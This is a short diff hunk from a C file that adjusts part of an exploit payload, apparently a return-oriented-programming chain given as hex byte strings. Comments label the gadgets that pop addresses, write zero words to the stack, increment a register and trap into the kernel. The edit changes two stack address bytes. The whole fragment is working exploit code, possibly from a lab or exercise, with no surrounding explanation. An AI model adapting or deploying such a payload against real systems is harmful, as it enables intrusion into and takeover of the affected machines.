@@ -27,10 +27,10 @@ int main(void)
                       "\x22\xA4\xBA\xBB\xf0\x28\xbf\xbf" // pop esp into ecx (future address of 0 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (0 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx
-                      "\x22\xA4\xBA\xBB\xe4\x28\xbf\xbf" // pop esp into ecx (future address of 1 word) 
+                      "\x22\xA4\xBA\xBB\xec\x28\xbf\xbf" // pop esp into ecx (future address of 1 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx
-                      "\x22\xA4\xBA\xBB\xe0\x28\xbf\xbf" // pop esp into ecx (future address of 2 word) 
+                      "\x22\xA4\xBA\xBB\xe8\x28\xbf\xbf" // pop esp into ecx (future address of 2 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (2 word) to stack
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x01\x01\x01\x01" // dummy value
